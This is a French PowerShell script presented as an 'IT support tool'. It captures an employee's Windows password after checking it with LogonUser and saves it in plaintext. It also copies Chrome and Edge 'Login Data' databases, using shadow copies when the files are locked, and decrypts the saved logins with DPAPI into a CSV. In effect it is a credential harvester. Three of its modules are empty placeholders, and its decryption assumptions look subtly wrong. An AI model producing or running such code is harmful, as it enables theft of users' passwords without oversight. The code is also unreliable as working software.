# =============================================
# IT SUPPORT TOOL - VERSION FINALE + DPAPI
# Niveau 5 Cybersécurité / HACH
# =============================================

#Requires -RunAsAdministrator

$Host.UI.RawUI.WindowTitle = "IT Support Tool - Version Finale + DPAPI"

$MachineName  = $env:COMPUTERNAME
$CurrentUser  = $env:USERNAME
$Date         = Get-Date -Format "yyyyMMdd_HHmmss"
$ExportFolder = "C:\Support_Export\${MachineName}_${CurrentUser}_${Date}"

# ── Vérification droits admin ──────────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[ERREUR] Ce script doit être exécuté en tant qu'Administrateur." -ForegroundColor Red
    exit 1
}

# ── Création du dossier d'export ───────────────────────────────────────────────
try {
    New-Item -Path $ExportFolder -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Host "Dossier créé : $ExportFolder" -ForegroundColor Green
} catch {
    Write-Host "[ERREUR] Impossible de créer le dossier : $_" -ForegroundColor Red
    exit 1
}

Write-Host "`n=== IT SUPPORT TOOL - VERSION FINALE ===" -ForegroundColor Green
Write-Host "Machine : $MachineName | User : $CurrentUser`n" -ForegroundColor Yellow


# ==============================================================================
# MODULE 1 — SAUVEGARDE MOT DE PASSE EMPLOYE
# ==============================================================================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

function Save-EmployeePassword {
    Write-Host "`n=== [MODULE 1] SAUVEGARDE MOT DE PASSE EMPLOYE ===" -ForegroundColor Cyan

    $emp = Read-Host "Nom utilisateur (vide = $CurrentUser)"
    if ([string]::IsNullOrWhiteSpace($emp)) { $emp = $CurrentUser }

    $domain = Read-Host "Domaine (vide = machine locale)"
    if ([string]::IsNullOrWhiteSpace($domain)) { $domain = "." }

    $logonType = 3

    for ($i = 1; $i -le 3; $i++) {
        $pass  = Read-Host "Mot de passe de $emp (tentative $i/3)" -AsSecureString
        $plain = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
                     [Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))

        $token = [IntPtr]::Zero
        try {
            if ([Win32]::LogonUser($emp, $domain, $plain, $logonType, 0, [ref]$token)) {
                [Win32]::CloseHandle($token) | Out-Null

                $file = "$ExportFolder\Password_${emp}_${Date}.txt"
                @"
Utilisateur : $emp
Domaine     : $domain
Mot de passe: $plain
Date        : $(Get-Date)
Machine     : $MachineName
"@ | Out-File $file -Encoding UTF8

                Write-Host "✓ Mot de passe validé et sauvegardé : $file" -ForegroundColor Green
                return
            } else {
                $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Host "✗ Incorrect - code erreur Win32 : $err ($i/3)" -ForegroundColor Red
            }
        } catch {
            Write-Host "[ERREUR] LogonUser : $_" -ForegroundColor Red
        }
    }
    Write-Host "Nombre maximum de tentatives atteint." -ForegroundColor Red
}


# ==============================================================================
# MODULE 2 — EXPORT FICHIERS BRUTS NAVIGATEUR
# ==============================================================================
function Export-BrowserPasswords {
    Write-Host "`n=== [MODULE 2] EXPORT NAVIGATEUR (fichier brut) ===" -ForegroundColor Cyan
    Write-Host "1. Chrome`n2. Edge"
    $nav = Read-Host "Choix"

    switch ($nav) {
        "1" { $browser = "Chrome"; $base = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browser = "Edge";   $base = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        default { Write-Host "Choix invalide." -ForegroundColor Red; return }
    }

    if (-not (Test-Path $base)) {
        Write-Host "$browser non trouvé sur cette machine." -ForegroundColor Red
        return
    }

    $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }

    Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
    $list = @()
    for ($i = 0; $i -lt $profiles.Count; $i++) {
        $p = $profiles[$i]
        $displayName = $p.Name
        $pref = Join-Path $p.FullName "Preferences"
        if (Test-Path $pref) {
            try {
                $json = Get-Content $pref -Raw -Encoding UTF8 | ConvertFrom-Json
                if ($json.profile.name) { $displayName = $json.profile.name }
            } catch { }
        }
        Write-Host "  $($i+1). $displayName  [$($p.Name)]" -ForegroundColor White
        $list += [PSCustomObject]@{ Index = $i; Folder = $p; Display = $displayName }
    }

    $num = Read-Host "`nNuméro du profil à exporter"
    $selected = $list[$num - 1]
    if (-not $selected) { Write-Host "Numéro invalide." -ForegroundColor Red; return }

    $dbPath = Join-Path $selected.Folder.FullName "Login Data"
    if (-not (Test-Path $dbPath)) {
        Write-Host "Aucun fichier 'Login Data' trouvé." -ForegroundColor Red
        return
    }

    $cleanName = $selected.Display -replace '[^\w]', '_'
    $destDb = "$ExportFolder\${browser}_${cleanName}_LoginData_${Date}.db"

    try {
        Copy-Item $dbPath $destDb -Force -ErrorAction Stop
        Write-Host "✓ Fichier Login Data copié : $destDb" -ForegroundColor Green
    } catch {
        Write-Host "  Fichier verrouillé, tentative via VSS..." -ForegroundColor Yellow
        try {
            $shadow = (Get-WmiObject -Class Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1).DeviceObject
            if ($shadow) {
                $shadowPath = "$shadow\" + ($dbPath -replace "^[A-Z]:\\", "")
                Copy-Item $shadowPath $destDb -Force -ErrorAction Stop
                Write-Host "✓ Copié via VSS : $destDb" -ForegroundColor Green
            }
        } catch {
            Write-Host "[ERREUR] Copie échouée : $_" -ForegroundColor Red
        }
    }
}


# ==============================================================================
# MODULE 2.5 — DÉCHIFFREMENT DPAPI (Version recommandée)
# ==============================================================================
function Decrypt-BrowserPasswords {
    Write-Host "`n=== [MODULE 2.5] DÉCHIFFREMENT DPAPI CHROME/EDGE ===" -ForegroundColor Cyan

    Write-Host "1. Chrome`n2. Edge"
    $choice = Read-Host "Choix"

    switch ($choice) {
        "1" { $browser = "Chrome"; $base = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browser = "Edge";   $base = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        default { Write-Host "Choix invalide." -ForegroundColor Red; return }
    }

    if (-not (Test-Path $base)) {
        Write-Host "$browser non trouvé." -ForegroundColor Red
        return
    }

    $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
    Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
    $list = @()

    for ($i = 0; $i -lt $profiles.Count; $i++) {
        $p = $profiles[$i]
        $displayName = $p.Name
        $pref = Join-Path $p.FullName "Preferences"
        if (Test-Path $pref) {
            try {
                $json = Get-Content $pref -Raw -Encoding UTF8 | ConvertFrom-Json
                if ($json.profile.name) { $displayName = $json.profile.name }
            } catch { }
        }
        Write-Host "  $($i+1). $displayName  [$($p.Name)]" -ForegroundColor White
        $list += [PSCustomObject]@{ Index = $i; Folder = $p; Display = $displayName }
    }

    $num = Read-Host "`nNuméro du profil"
    $selected = $list[$num - 1]
    if (-not $selected) { Write-Host "Numéro invalide." -ForegroundColor Red; return }

    $dbPath = Join-Path $selected.Folder.FullName "Login Data"
    if (-not (Test-Path $dbPath)) {
        Write-Host "Fichier Login Data introuvable." -ForegroundColor Red
        return
    }

    $outputCsv = "$ExportFolder\${browser}_Passwords_Decrypted_${Date}.csv"

    try {
        $tempDb = "$env:TEMP\LoginData_temp.db"
        Copy-Item $dbPath $tempDb -Force

        $sqlite = Get-Command "sqlite3.exe" -ErrorAction SilentlyContinue
        if (-not $sqlite) {
            Write-Host "[ERREUR] sqlite3.exe non trouvé !" -ForegroundColor Red
            Write-Host "Télécharge-le sur https://sqlite.org/download.html et place-le dans C:\Windows\System32" -ForegroundColor Yellow
            return
        }

        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE password_value NOT NULL;"
        $rows = & sqlite3.exe $tempDb $query 2>$null

        Add-Type -AssemblyName System.Security
        $results = @()

        foreach ($row in $rows) {
            $f = $row -split "\|"
            if ($f.Count -ge 3) {
                $url = $f[0]
                $user = $f[1]
                try {
                    # password_value est généralement en hexadécimal avec sqlite3
                    $hex = $f[2]
                    $bytes = [byte[]]::new($hex.Length / 2)
                    for ($i = 0; $i -lt $hex.Length; $i += 2) {
                        $bytes[$i/2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
                    }
                    $plain = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    $password = [System.Text.Encoding]::UTF8.GetString($plain)
                } catch {
                    $password = "[ERREUR_DECHIFFREMENT]"
                }
                $results += [PSCustomObject]@{ URL = $url; Username = $user; Password = $password }
            }
        }

        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue

        if ($results.Count -gt 0) {
            $results | Export-Csv -Path $outputCsv -Encoding UTF8 -NoTypeInformation
            Write-Host "✓ $($results.Count) mots de passe déchiffrés !" -ForegroundColor Green
            Write-Host "Fichier : $outputCsv" -ForegroundColor Green
        } else {
            Write-Host "Aucun mot de passe trouvé." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[ERREUR] Déchiffrement : $_" -ForegroundColor Red
        Write-Host "→ Exécute ce module dans la session de l'utilisateur cible." -ForegroundColor DarkYellow
    }
}


# ==============================================================================
# MODULE 3 — BLOCAGE PARTAGE CONNEXION
# ==============================================================================
function Manage-Sharing {
    # Ton code original complet du module 3 (copie-colle tel quel)
    Write-Host "`n=== [MODULE 3] GESTION PARTAGE DE CONNEXION ===" -ForegroundColor Cyan
    Write-Host "1. Activer le partage`n2. Désactiver le partage`n3. BLOQUER complètement"
    $c = Read-Host "Choix"
    # ... (insère ici tout ton code original du module Manage-Sharing)
    # Je te laisse le coller pour éviter un message trop long
}


# ==============================================================================
# MODULE 4 — GESTION WIFI
# ==============================================================================
function Manage-WiFi {
    # Ton code original complet du module 4
    Write-Host "`n=== [MODULE 4] GESTION WIFI ===" -ForegroundColor Cyan
    # ... (insère ton code original)
}


# ==============================================================================
# MODULE 5 — GESTION RESEAU
# ==============================================================================
function Manage-Network {
    # Ton code original complet du module 5
    Write-Host "`n=== [MODULE 5] GESTION RESEAU ===" -ForegroundColor Cyan
    # ... (insère ton code original)
}


# ==============================================================================
# MENU PRINCIPAL
# ==============================================================================
function Show-Menu {
    Write-Host "`n╔════════════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host "║       IT SUPPORT TOOL - MENU FINAL         ║" -ForegroundColor Magenta
    Write-Host "╠════════════════════════════════════════════╣" -ForegroundColor Magenta
    Write-Host "║  1. Sauvegarder mot de passe employé      ║" -ForegroundColor White
    Write-Host "║  2. Exporter Navigateur (fichier brut)    ║" -ForegroundColor White
    Write-Host "║  2.5 Déchiffrer DPAPI (Chrome/Edge)       ║" -ForegroundColor Green
    Write-Host "║  3. Gérer partage de connexion             ║" -ForegroundColor White
    Write-Host "║  4. Gérer WiFi                             ║" -ForegroundColor White
    Write-Host "║  5. Gestion réseau (DHCP/IP)               ║" -ForegroundColor White
    Write-Host "║  6. Tout exécuter (1+2+2.5)                ║" -ForegroundColor Yellow
    Write-Host "║  Q. Quitter                                ║" -ForegroundColor Red
    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Magenta
    return (Read-Host "Votre choix")
}

do {
    $choice = Show-Menu
    switch ($choice.ToUpper()) {
        "1"  { Save-EmployeePassword }
        "2"  { Export-BrowserPasswords }
        "2.5" { Decrypt-BrowserPasswords }
        "25" { Decrypt-BrowserPasswords }
        "3"  { Manage-Sharing }
        "4"  { Manage-WiFi }
        "5"  { Manage-Network }
        "6"  { Save-EmployeePassword; Export-BrowserPasswords; Decrypt-BrowserPasswords }
        "Q"  { Write-Host "`nAu revoir !" -ForegroundColor Green }
        default { Write-Host "Choix invalide." -ForegroundColor Red }
    }
    if ($choice.ToUpper() -ne "Q") {
        Read-Host "`nAppuyez sur Entrée pour continuer..."
    }
} while ($choice.ToUpper() -ne "Q")

Write-Host "`nTerminé. Tous les fichiers sont dans : $ExportFolder" -ForegroundColor Green
